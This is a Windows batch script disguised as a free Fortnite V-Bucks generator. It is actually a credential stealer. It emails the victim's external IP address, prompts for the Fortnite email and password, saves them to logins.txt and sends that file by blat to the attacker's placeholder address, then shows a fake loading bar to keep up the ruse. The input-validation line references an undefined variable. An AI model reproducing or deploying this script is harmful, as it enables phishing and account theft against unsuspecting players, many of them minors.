@echo off

blat -installSMTP aspmx.l.google.com <youremail>

for /f "tokens=1* delims=: " %%A in (
  'nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"'
) Do set ExtIP=%%B
Echo External IP is : %ExtIP%

blat -s "IP" -to <youremail> -f ip@domain.com -body "%ExtIP%"

pause

:start
@echo off
cls
title FREE FORTNITE V-BUCKS BOOSTER
echo ########## Type in your e-mail and password to FORTNITE account ########## 
echo. 
echo. 
Set /p login:= E-mail: 
Set /p pass:= Password: 
Set /p vbucks:= How many v-bucks do you want? 
SET "var="&for /f "delims=0123456789" %%i in ("%vdolce:%") do set var=%%i

if defined var (
echo Bad answer. Click anything to start again.
pause
goto :start
)

echo. 
echo Login: %login:% Password: %pass:% V-bucks: %vbucks:% >logins.txt

@echo off
blat logins.txt -s "Logins" -to <youremail> -f logins@domain.com

@echo off
    setlocal enableextensions enabledelayedexpansion

    for /l %%a in (0 10 100) do (
        call :loadingScreen %%a
        >nul ping -n 5 "" 
    )
    echo(
    pause
    goto :eof

:loadingScreen percent
    setlocal enableextensions enabledelayedexpansion

    rem Prepare everything 
    set    "sb=+----------+"
    set "fill=^|##########^|"
    set    "eb=+----------+"
    set /a "chars=2+%~1/10"
    set "spaces=!fill:~%chars%!"
    set "loadBar=!fill:~0,%chars%!!spaces:#= !"

    rem Time to paint
    (   cls
        echo(%time%
        echo(
        echo(                                      %sb%
        echo(     V-bucks are yours in few seconds! %loadBar%
        echo(                                      %eb%
        echo(
	echo(
    ) 
    goto :eof